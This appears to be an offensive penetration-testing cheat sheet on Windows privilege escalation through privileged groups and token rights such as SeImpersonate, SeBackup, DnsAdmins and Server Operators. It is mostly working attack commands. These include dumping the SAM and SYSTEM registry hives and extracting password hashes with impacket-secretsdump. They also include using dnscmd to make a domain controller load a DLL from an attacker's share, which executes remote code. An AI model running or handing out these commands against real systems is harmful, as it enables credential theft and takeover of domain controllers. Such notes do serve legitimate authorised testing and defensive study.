# Privileged groups and token rights

```powershell
whoami /all
whoami /groups
whoami /priv
net localgroup
```
- Named rights may need enabling.

| Finding | Follow-up |
| --- | --- |
| `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` | [potato](potato.md) |
| Backup Operators / `SeBackupPrivilege` | Save SAM + SYSTEM (below) |
| DnsAdmins | DNS server plug-in DLL + service restart |
| Server Operators | Service config + restart rights |
| `SeDebugPrivilege` | Inspect LSASS / privileged processes → [credential-access](credential-access.md) |

## Backup right
```powershell
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```
```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## DnsAdmins / Server Operators
```cmd
dnscmd <DC-FQDN> /config /serverlevelplugindll \\<KALI>\share\plugin.dll
sc.exe \\<DC-FQDN> query dns
sc.exe qc <SERVICE>
```
- DnsAdmins: plug-in DLL + restart of the DNS service. Server Operators: exact service rights → [ad/privileged-groups](../ad/privileged-groups.md#server-operators).
